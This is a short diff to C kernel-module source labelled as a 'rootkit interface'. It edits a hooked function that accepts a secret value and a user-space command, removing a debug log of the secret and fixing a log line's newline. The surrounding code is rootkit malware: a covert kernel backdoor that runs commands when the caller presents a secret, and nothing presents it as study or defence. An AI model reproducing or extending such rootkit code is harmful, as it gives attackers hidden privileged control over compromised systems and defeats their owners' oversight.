@@ -54,8 +54,6 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
   char command_buf[100]; /* easier than `kmalloc`ing */
   iface_command_handler_t handler;
   unsigned int i;
-
-  printk(KERN_INFO "[rootkit interface]: `iface__hook_func(0x%lx, ...)` (secret = 0x%lx).\n", secret, iface__secret);////////////
   
   if (!iface__hook.hooked)
     return -EINVAL;
@@ -69,7 +67,7 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
     we don't care if this fails, because `strcmp`
     will take care of invalid buffers
     */
-printk(KERN_INFO "[rootkit interface] got secret");
+printk(KERN_INFO "[rootkit interface] got secret\n");
     memset(command_buf, '\0', sizeof(command_buf));
     strncpy_from_user(command_buf, command, sizeof(command_buf));
 
